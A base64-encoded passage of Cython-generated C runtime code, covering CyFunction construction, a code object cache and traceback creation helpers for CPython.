ICopIGZ1bmM7XG4gICAgbS0+ZnVuY19hbm5vdGF0aW9ucyA9IGRpY3Q7XG4gICAgUHlfSU5DUkVGKGRpY3QpO1xufVxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9OZXcoUHlNZXRob2REZWYgKm1sLCBpbnQgZmxhZ3MsIFB5T2JqZWN0KiBxdWFsbmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNsb3N1cmUsIFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0KiBnbG9iYWxzLCBQeU9iamVjdCogY29kZSkge1xuICAgIFB5T2JqZWN0ICpvcCA9IF9fUHl4X0N5RnVuY3Rpb25fSW5pdChcbiAgICAgICAgUHlPYmplY3RfR0NfTmV3KF9fcHl4X0N5RnVuY3Rpb25PYmplY3QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0N5RnVuY3Rpb25UeXBlKSxcbiAgICAgICAgbWwsIGZsYWdzLCBxdWFsbmFtZSwgY2xvc3VyZSwgbW9kdWxlLCBnbG9iYWxzLCBjb2RlXG4gICAgKTtcbiAgICBpZiAobGlrZWx5KG9wKSkge1xuICAgICAgICBQeU9iamVjdF9HQ19UcmFjayhvcCk7XG4gICAgfVxuICAgIHJldHVybiBvcDtcbn1cblxuXG4jaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAmJiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLX1JVTlRJTUVcbnN0YXRpYyBpbnQgX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2soUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBpbnQgY19saW5lKSB7XG4gICAgUHlPYmplY3QgKnVzZV9jbGluZTtcbiAgICBQeU9iamVjdCAqcHR5cGUsICpwdmFsdWUsICpwdHJhY2ViYWNrO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgIFB5T2JqZWN0ICoqY3l0aG9uX3J1bnRpbWVfZGljdDtcbiNlbmRpZlxuICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKHRzdGF0ZSk7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jeXRob25fcnVudGltZSkpIHtcbiAgICAgICAgcmV0dXJuIGNfbGluZTtcbiAgICB9XG4gICAgX19QeXhfRXJyRmV0Y2hJblN0YXRlKHRzdGF0ZSwgJnB0eXBlLCAmcHZhbHVlLCAmcHRyYWNlYmFjayk7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgY3l0aG9uX3J1bnRpbWVfZGljdCA9IF9QeU9iamVjdF9HZXREaWN0UHRyKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2N5dGhvbl9ydW50aW1lKTtcbiAgICBpZiAobGlrZWx5KGN5dGhvbl9ydW50aW1lX2RpY3QpKSB7XG4gICAgICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oKmN5dGhvbl9ydW50aW1lX2RpY3QpO1xuICAgICAgICBfX1BZWF9QWV9ESUNUX0xPT0tVUF9JRl9NT0RJRklFRChcbiAgICAgICAgICAgIHVzZV9jbGluZSwgKmN5dGhvbl9ydW50aW1lX2RpY3QsXG4gICAgICAgICAgICBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cigqY3l0aG9uX3J1bnRpbWVfZGljdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsaW5lX2luX3RyYWNlYmFjaykpXG4gICAgICAgIFB5X1hJTkNSRUYodXNlX2NsaW5lKTtcbiAgICAgICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICB9IGVsc2VcbiNlbmRpZlxuICAgIHtcbiAgICAgIFB5T2JqZWN0ICp1c2VfY2xpbmVfb2JqID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGluZV9pbl90cmFjZWJhY2spO1xuICAgICAgaWYgKHVzZV9jbGluZV9vYmopIHtcbiAgICAgICAgdXNlX2NsaW5lID0gUHlPYmplY3RfTm90KHVzZV9jbGluZV9vYmopID8gUHlfRmFsc2UgOiBQeV9UcnVlO1xuICAgICAgICBQeV9JTkNSRUYodXNlX2NsaW5lKTtcbiAgICAgICAgUHlfREVDUkVGKHVzZV9jbGluZV9vYmopO1xuICAgICAgfSBlbHNlIHtcbiAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgdXNlX2NsaW5lID0gTlVMTDtcbiAgICAgIH1cbiAgICB9XG4gICAgaWYgKCF1c2VfY2xpbmUpIHtcbiAgICAgICAgY19saW5lID0gMDtcbiAgICAgICAgKHZvaWQpIFB5T2JqZWN0X1NldEF0dHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGluZV9pbl90cmFjZWJhY2ssIFB5X0ZhbHNlKTtcbiAgICB9XG4gICAgZWxzZSBpZiAodXNlX2NsaW5lID09IFB5X0ZhbHNlIHx8ICh1c2VfY2xpbmUgIT0gUHlfVHJ1ZSAmJiBQeU9iamVjdF9Ob3QodXNlX2NsaW5lKSAhPSAwKSkge1xuICAgICAgICBjX2xpbmUgPSAwO1xuICAgIH1cbiAgICBQeV9YREVDUkVGKHVzZV9jbGluZSk7XG4gICAgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUodHN0YXRlLCBwdHlwZSwgcHZhbHVlLCBwdHJhY2ViYWNrKTtcbiAgICByZXR1cm4gY19saW5lO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIGludCBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzLCBpbnQgY291bnQsIGludCBjb2RlX2xpbmUpIHtcbiAgICBpbnQgc3RhcnQgPSAwLCBtaWQgPSAwLCBlbmQgPSBjb3VudCAtIDE7XG4gICAgaWYgKGVuZCA+PSAwICYmIGNvZGVfbGluZSA+IGVudHJpZXNbZW5kXS5jb2RlX2xpbmUpIHtcbiAgICAgICAgcmV0dXJuIGNvdW50O1xuICAgIH1cbiAgICB3aGlsZSAoc3RhcnQgPCBlbmQpIHtcbiAgICAgICAgbWlkID0gc3RhcnQgKyAoZW5kIC0gc3RhcnQpIC8gMjtcbiAgICAgICAgaWYgKGNvZGVfbGluZSA8IGVudHJpZXNbbWlkXS5jb2RlX2xpbmUpIHtcbiAgICAgICAgICAgIGVuZCA9IG1pZDtcbiAgICAgICAgfSBlbHNlIGlmIChjb2RlX2xpbmUgPiBlbnRyaWVzW21pZF0uY29kZV9saW5lKSB7XG4gICAgICAgICAgICAgc3RhcnQgPSBtaWQgKyAxO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0dXJuIG1pZDtcbiAgICAgICAgfVxuICAgIH1cbiAgICBpZiAoY29kZV9saW5lIDw9IGVudHJpZXNbbWlkXS5jb2RlX2xpbmUpIHtcbiAgICAgICAgcmV0dXJuIG1pZDtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXR1cm4gbWlkICsgMTtcbiAgICB9XG59XG5zdGF0aWMgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKl9fcHl4X19maW5kX2NvZGVfb2JqZWN0KHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUsIGludCBjb2RlX2xpbmUpIHtcbiAgICBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSogY29kZV9vYmplY3Q7XG4gICAgaW50IHBvcztcbiAgICBpZiAodW5saWtlbHkoIWNvZGVfbGluZSkgfHwgdW5saWtlbHkoIWNvZGVfY2FjaGUtPmVudHJpZXMpKSB7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBwb3MgPSBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKGNvZGVfY2FjaGUtPmVudHJpZXMsIGNvZGVfY2FjaGUtPmNvdW50LCBjb2RlX2xpbmUpO1xuICAgIGlmICh1bmxpa2VseShwb3MgPj0gY29kZV9jYWNoZS0+Y291bnQpIHx8IHVubGlrZWx5KGNvZGVfY2FjaGUtPmVudHJpZXNbcG9zXS5jb2RlX2xpbmUgIT0gY29kZV9saW5lKSkge1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgY29kZV9vYmplY3QgPSBjb2RlX2NhY2hlLT5lbnRyaWVzW3Bvc10uY29kZV9vYmplY3Q7XG4gICAgUHlfSU5DUkVGKGNvZGVfb2JqZWN0KTtcbiAgICByZXR1cm4gY29kZV9vYmplY3Q7XG59XG5zdGF0aWMgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKl9fcHl4X2ZpbmRfY29kZV9vYmplY3QoaW50IGNvZGVfbGluZSkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmICFDWVRIT05fQVRPTUlDU1xuICAgICh2b2lkKV9fcHl4X19maW5kX2NvZGVfb2JqZWN0O1xuICAgIHJldHVybiBOVUxMOyAvLyBNb3N0IGltcGxlbWVudGF0aW9uIHNob3VsZCBoYXZlIGF0b21pY3MuIEJ1dCBvdGhlcndpc2UsIGRvblwndCBtYWtlIGl0IHRocmVhZC1zYWZlLCBqdXN0IG1pc3MuXG4jZWxzZVxuICAgIHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUgPSAmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZV9jYWNoZTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBvbGRfY291bnQgPSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKCZjb2RlX2NhY2hlLT5hY2Nlc3Nvcl9jb3VudCk7XG4gICAgaWYgKG9sZF9jb3VudCA8IDApIHtcbiAgICAgICAgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCgmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQpO1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4jZW5kaWZcbiAgICBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSAqcmVzdWx0ID0gX19weXhfX2ZpbmRfY29kZV9vYmplY3QoY29kZV9jYWNoZSwgY29kZV9saW5lKTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJmNvZGVfY2FjaGUtPmFjY2Vzc29yX2NvdW50KTtcbiNlbmRpZlxuICAgIHJldHVybiByZXN1bHQ7XG4jZW5kaWZcbn1cbnN0YXRpYyB2b2lkIF9fcHl4X19pbnNlcnRfY29kZV9vYmplY3Qoc3RydWN0IF9fUHl4X0NvZGVPYmplY3RDYWNoZSAqY29kZV9jYWNoZSwgaW50IGNvZGVfbGluZSwgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIGNvZGVfb2JqZWN0KVxue1xuICAgIGludCBwb3MsIGk7XG4gICAgX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqIGVudHJpZXMgPSBjb2RlX2NhY2hlLT5lbnRyaWVzO1xuICAgIGlmICh1bmxpa2VseSghY29kZV9saW5lKSkge1xuICAgICAgICByZXR1cm47XG4gICAgfVxuICAgIGlmICh1bmxpa2VseSghZW50cmllcykpIHtcbiAgICAgICAgZW50cmllcyA9IChfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSopUHlNZW1fTWFsbG9jKDY0KnNpemVvZihfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSkpO1xuICAgICAgICBpZiAobGlrZWx5KGVudHJpZXMpKSB7XG4gICAgICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzID0gZW50cmllcztcbiAgICAgICAgICAgIGNvZGVfY2FjaGUtPm1heF9jb3VudCA9IDY0O1xuICAgICAgICAgICAgY29kZV9jYWNoZS0+Y291bnQgPSAxO1xuICAgICAgICAgICAgZW50cmllc1swXS5jb2RlX2xpbmUgPSBjb2RlX2xpbmU7XG4gICAgICAgICAgICBlbnRyaWVzWzBdLmNvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7XG4gICAgICAgICAgICBQeV9JTkNSRUYoY29kZV9vYmplY3QpO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybjtcbiAgICB9XG4gICAgcG9zID0gX19weXhfYmlzZWN0X2NvZGVfb2JqZWN0cyhjb2RlX2NhY2hlLT5lbnRyaWVzLCBjb2RlX2NhY2hlLT5jb3VudCwgY29kZV9saW5lKTtcbiAgICBpZiAoKHBvcyA8IGNvZGVfY2FjaGUtPmNvdW50KSAmJiB1bmxpa2VseShjb2RlX2NhY2hlLT5lbnRyaWVzW3Bvc10uY29kZV9saW5lID09IGNvZGVfbGluZSkpIHtcbiAgICAgICAgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIHRtcCA9IGVudHJpZXNbcG9zXS5jb2RlX29iamVjdDtcbiAgICAgICAgZW50cmllc1twb3NdLmNvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7XG4gICAgICAgIFB5X0lOQ1JFRihjb2RlX29iamVjdCk7XG4gICAgICAgIFB5X0RFQ1JFRih0bXApO1xuICAgICAgICByZXR1cm47XG4gICAgfVxuICAgIGlmIChjb2RlX2NhY2hlLT5jb3VudCA9PSBjb2RlX2NhY2hlLT5tYXhfY291bnQpIHtcbiAgICAgICAgaW50IG5ld19tYXggPSBjb2RlX2NhY2hlLT5tYXhfY291bnQgKyA2NDtcbiAgICAgICAgZW50cmllcyA9IChfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSopUHlNZW1fUmVhbGxvYyhcbiAgICAgICAgICAgIGNvZGVfY2FjaGUtPmVudHJpZXMsICgoc2l6ZV90KW5ld19tYXgpICogc2l6ZW9mKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KSk7XG4gICAgICAgIGlmICh1bmxpa2VseSghZW50cmllcykpIHtcbiAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgfVxuICAgICAgICBjb2RlX2NhY2hlLT5lbnRyaWVzID0gZW50cmllcztcbiAgICAgICAgY29kZV9jYWNoZS0+bWF4X2NvdW50ID0gbmV3X21heDtcbiAgICB9XG4gICAgZm9yIChpPWNvZGVfY2FjaGUtPmNvdW50OyBpPnBvczsgaS0tKSB7XG4gICAgICAgIGVudHJpZXNbaV0gPSBlbnRyaWVzW2ktMV07XG4gICAgfVxuICAgIGVudHJpZXNbcG9zXS5jb2RlX2xpbmUgPSBjb2RlX2xpbmU7XG4gICAgZW50cmllc1twb3NdLmNvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7XG4gICAgY29kZV9jYWNoZS0+Y291bnQrKztcbiAgICBQeV9JTkNSRUYoY29kZV9vYmplY3QpO1xufVxuc3RhdGljIHZvaWQgX19weXhfaW5zZXJ0X2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUsIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdCkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmICFDWVRIT05fQVRPTUlDU1xuICAgICh2b2lkKV9fcHl4X19pbnNlcnRfY29kZV9vYmplY3Q7XG4gICAgcmV0dXJuOyAvLyBNb3N0IGltcGxlbWVudGF0aW9uIHNob3VsZCBoYXZlIGF0b21pY3MuIEJ1dCBvdGhlcndpc2UsIGRvblwndCBtYWtlIGl0IHRocmVhZC1zYWZlLCBqdXN0IGZhaWwuXG4jZWxzZVxuICAgIHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUgPSAmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZV9jYWNoZTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBleHBlY3RlZCA9IDA7XG4gICAgaWYgKCFfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSgmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQsICZleHBlY3RlZCwgSU5UX01JTikpIHtcbiAgICAgICAgcmV0dXJuO1xuICAgIH1cbiNlbmRpZlxuICAgIF9fcHl4X19pbnNlcnRfY29kZV9vYmplY3QoY29kZV9jYWNoZSwgY29kZV9saW5lLCBjb2RlX29iamVjdCk7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAgICBfX3B5eF9hdG9taWNfc3ViKCZjb2RlX2NhY2hlLT5hY2Nlc3Nvcl9jb3VudCwgSU5UX01JTik7XG4jZW5kaWZcbiNlbmRpZlxufVxuXG5cbiNpbmNsdWRlICJjb21waWxlLmgiXG4jaW5jbHVkZSAiZnJhbWVvYmplY3QuaCJcbiNpbmNsdWRlICJ0cmFjZWJhY2suaCJcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMGE2ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmICFkZWZpbmVkKFBZUFlfVkVSU0lPTilcbiAgI2lmbmRlZiBQeV9CVUlMRF9DT1JFXG4gICAgI2RlZmluZSBQeV9CVUlMRF9DT1JFIDFcbiAgI2VuZGlmXG4gICNpbmNsdWRlICJpbnRlcm5hbC9weWNvcmVfZnJhbWUuaCJcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlDb2RlX1JlcGxhY2VfRm9yX0FkZFRyYWNlYmFjayhQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKnNjcmF0Y2hfZGljdCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZmlyc3RsaW5lbm8sIFB5T2JqZWN0ICpuYW1lKSB7XG4gICAgUHlPYmplY3QgKnJlcGxhY2UgPSBOVUxMO1xuICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbVN0cmluZyhzY3JhdGNoX2RpY3QsICJjb19maXJzdGxpbmVubyIsIGZpcnN0bGluZW5vKSkpIHJldHVybiBOVUxMO1xuICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbVN0cmluZyhzY3JhdGNoX2RpY3QsICJjb19uYW1lIiwgbmFtZSkpKSByZXR1cm4gTlVMTDtcbiAgICByZXBsYWNlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhjb2RlLCAicmVwbGFjZSIpO1xuICAgIGlmIChsaWtlbHkocmVwbGFjZSkpIHtcbiAgICAgICAgUHlPYmplY3QgKnJlc3VsdCA9IFB5T2JqZWN0X0NhbGwocmVwbGFjZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIHNjcmF0Y2hfZGljdCk7XG4gICAgICAgIFB5X0RFQ1JFRihyZXBsYWNlKTtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4gICAgUHlFcnJfQ2xlYXIoKTtcbiAgICByZXR1cm4gTlVMTDtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X0FkZFRyYWNlYmFjayhjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgcHlfbGluZSwgY29uc3QgY2hhciAqZmlsZW5hbWUpIHtcbiAgICBQeU9iamVjdCAqY29kZV9vYmplY3QgPSBOVUxMLCAqcHlfcHlfbGluZSA9IE5VTEwsICpweV9mdW5jbmFtZSA9IE5VTEwsICpkaWN0ID0gTlVMTDtcbiAgICBQeU9iamVjdCAqcmVwbGFjZSA9IE5VTEwsICpnZXRmcmFtZSA9IE5VTEwsICpmcmFtZSA9IE5VTEw7XG4gICAgUHlPYmplY3QgKmV4Y190eXBlLCAqZXhjX3ZhbHVlLCAqZXhjX3RyYWNlYmFjaztcbiAgICBpbnQgc3VjY2VzcyA9IDA7XG4gICAgaWYgKGNfbGluZSkge1xuICAgICAgICAodm9pZCkgX19weXhfY2ZpbGVubTtcbiAgICAgICAgKHZvaWQpIF9fUHl4X0NMaW5lRm9yVHJhY2ViYWNrKF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudCwgY19saW5lKTtcbiAgICB9XG4gICAgUHlFcnJfRmV0Y2goJmV4Y190eXBlLCAmZXhjX3ZhbHVlLCAmZXhjX3RyYWNlYmFjayk7XG4gICAgY29kZV9vYmplY3QgPSBfX3B5eF9maW5kX2NvZGVfb2JqZWN0KGNfbGluZSA/IC1jX2xpbmUgOiBweV9saW5lKTtcbiAgICBpZiAoIWNvZGVfb2JqZWN0KSB7XG4gICAgICAgIGNvZGVfb2JqZWN0ID0gUHlfQ29tcGlsZVN0cmluZygiX2dldGZyYW1lKCkiLCBmaWxlbmFtZSwgUHlfZXZhbF9pbnB1dCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghY29kZV9vYmplY3QpKSBnb3RvIGJhZDtcbiAgICAgICAgcHlfcHlfbGluZSA9IFB5TG9uZ19Gcm9tTG9uZyhweV9saW5lKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFweV9weV9saW5lKSkgZ290byBiYWQ7XG4gICAgICAgIHB5X2Z1bmNuYW1lID0gUHlVbmljb2RlX0Zyb21TdHJpbmcoZnVuY25hbWUpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXB5X2Z1bmNuYW1lKSkgZ290byBiYWQ7XG4gICAgICAgIGRpY3QgPSBQeURpY3RfTmV3KCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghZGljdCkpIGdvdG8gYmFkO1xuICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqb2xkX2NvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7XG4gICAgICAgICAgICBjb2RlX29iamVjdCA9IF9fUHl4X1B5Q29kZV9SZXBsYWNlX0Zvcl9BZGRUcmFjZWJhY2soY29kZV9vYmplY3QsIGRpY3QsIHB5X3B5X2xpbmUsIHB5X2Z1bmNuYW1lKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihvbGRfY29kZV9vYmplY3QpO1xuICAgICAgICB9XG4gICAgICAgIGlmICh1bmxpa2VseSghY29kZV9vYmplY3QpKSBnb3RvIGJhZDtcbiAgICAgICAgX19weXhfaW5zZXJ0X2NvZGVfb2JqZWN0KGNfbGluZSA/IC1jX2xpbmUgOiBweV9saW5lLCBjb2RlX29iamVjdCk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgZGljdCA9IFB5RGljdF9OZXcoKTtcbiAgICB9XG4gICAgZ2V0ZnJhbWUgPSBQeVN5c19HZXRPYmplY3QoIl9nZXRmcmFtZSIpO1xuICAgIGlmICh1bmxpa2VseSghZ2V0ZnJhbWUpKSBnb3RvIGJhZDtcbiAgICBpZiAodW5saWtlbHkoUHlEaWN0X1NldEl0ZW1TdHJpbmcoZGljdCwgIl9nZXRmcmFtZSIsIGdldGZyYW1lKSkpIGdvdG8gYmFkO1xuICAgIGZyYW1lID0gUHlFdmFsX0V2YWxDb2RlKGNvZGVfb2JqZWN0LCBkaWN0LCBkaWN0KTtcbiAgICBpZiAodW5saWtlbHkoIWZyYW1lKSB8fCBmcmFtZSA9PSBQeV9Ob25lKSBnb3RvIGJhZDtcbiAgICBzdWNjZXNzID0gMTtcbiAgYmFkOlxuICAgIFB5RXJyX1Jlc3RvcmUoZXhjX3R5cGUsIGV4Y192YWx1ZSwgZXhjX3RyYWNlYmFjayk7XG4gICAgUHlfWERFQ1JFRihjb2RlX29iamVjdCk7XG4gICAgUHlfWERFQ1JFRihweV9weV9saW5lKTtcbiAgICBQeV9YREVDUkVGKHB5X2Z1bmNuYW1lKTtcbiAgICBQeV9YREVDUkVGKGRpY3QpO1xuICAgIFB5X1hERUNSRUYocmVwbGFjZSk7XG4gICAgaWYgKHN1Y2Nlc3MpIHtcbiAgICAgICAgUHlUcmFjZUJhY2tfSGVyZShcbiAgICAgICAgICAgIChzdHJ1Y3QgX2ZyYW1lKilmcmFtZSk7XG4gICAgfVxuICAgIFB5X1hERUNSRUYoZnJhbWUpO1xufVxuI2Vsc2VcbnN0YXRpYyBQeUNvZGVPYmplY3QqIF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RGb3JUcmFjZWJhY2soXG4gICAgICAgICAgICBjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSxcbiAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSkge1xuICAgIFB5Q29kZU9iamVjdCAqcHlfY29kZSA9IE5VTEw7XG4gICAgUHlPYmplY3QgKnB5X2Z1bmNuYW1lID0gTlVMTDtcbiAgICBpZiAoY19saW5lKSB7XG4gICAgICAgIHB5X2Z1bmNuYW1lID0gUHlVbmljb2RlX0Zyb21Gb3JtYXQoICIlcyAoJXM6JWQpIiwgZnVuY25hbWUsIF9fcHl4X2NmaWxlbm0sIGNfbGluZSk7XG4gICAgICAgIGlmICghcHlfZnVuY25hbWUpIGdvdG8gYmFkO1xuICAgICAgICBmdW5jbmFtZSA9IFB5VW5pY29kZV9Bc1VURjgocHlfZnVuY25hbWUpO1xuICAgICAgICBpZiAoIWZ1bmNuYW1lKSBnb3RvIGJhZDtcbiAgICB9XG4gICAgcHlfY29kZSA9IFB5Q29kZV9OZXdFbXB0eShmaWxlbmFtZSwgZnVuY25hbWUsIHB5X2xpbmUpO1xuICAgIFB5X1hERUNSRUYocHlfZnVuY25hbWUpO1xuICAgIHJldHVybiBweV9jb2RlO1xuYmFkOlxuICAgIFB5X1hERUNSRUYocHlfZnVuY25hbWUpO1xuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIHZvaWQgX19QeXhfQWRkVHJhY2ViYWNrKGNvbnN0IGNoYXIgKmZ1bmNuYW1lLCBpbnQgY19saW5lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSkge1xuICAgIFB5Q29kZU9iamVjdCAqcHlfY29kZSA9IDA7XG4gICAgUHlGcmFtZU9iamVjdCAqcHlfZnJhbWUgPSAwO1xuICAgIFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSA9IF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudDtcbiAgICBQeU9iamVjdCAqcHR5cGUsICpwdmFsdWUsICpwdHJhY2ViYWNrO1xuICAgIGlmIChjX2xpbmUpIHtcbiAgICAgICAgY19saW5lID0gX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2sodHN0YXRlLCBjX2xpbmUpO1xuICAgIH1cbiAgICBweV9jb2RlID0gX19weXhfZmluZF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSk7XG4gICAgaWYgKCFweV9jb2RlKSB7XG4gICAgICAgIF9fUHl4X0VyckZldGNoSW5TdGF0ZSh0c3RhdGUsICZwdHlwZSwgJnB2YWx1ZSwgJnB0cmFjZWJhY2spO1xuICAgICAgICBweV9jb2RlID0gX19QeXhfQ3JlYXRlQ29kZU9iamVjdEZvclRyYWNlYmFjayhcbiAgICAgICAgICAgIGZ1bmNuYW1lLCBjX2xpbmUsIHB5X2xpbmUsIGZpbGVuYW1lKTtcbiAgICAgICAgaWYgKCFweV9jb2RlKSB7XG4gICAgICAgICAgICBcbiAgICAgICAgICAgIFB5X1hERUNSRUYocHR5cGUpO1xuICAgICAgICAgICAgUHlfWERFQ1JFRihwdmFsdWUpO1xuICAgICAgICAgICAgUHlfWERFQ1JFRihwdHJhY2ViYWNrKTtcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKHRzdGF0ZSwgcHR5cGUsIHB2YWx1ZSwgcHRyYWNlYmFjayk7XG4gICAgICAgIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSwgcHlfY29kZSk7XG4gICAgfVxuICAgIHB5X2ZyYW1lID0gUHlGcmFtZV9OZXcoXG4gICAgICAgIHRzdGF0ZSwgICAgICAgICAgICBcbiAgICAgICAgcHlfY29kZSwgICAgICAgICAgIFxuICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAgICBcbiAgICAgICAgMCAgICAgICAgICAgICAgICAgIFxuICAgICk7XG4gICAgaWYgKCFweV9mcmFtZSkgZ290byBiYWQ7XG4gICAgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKHB5X2Zy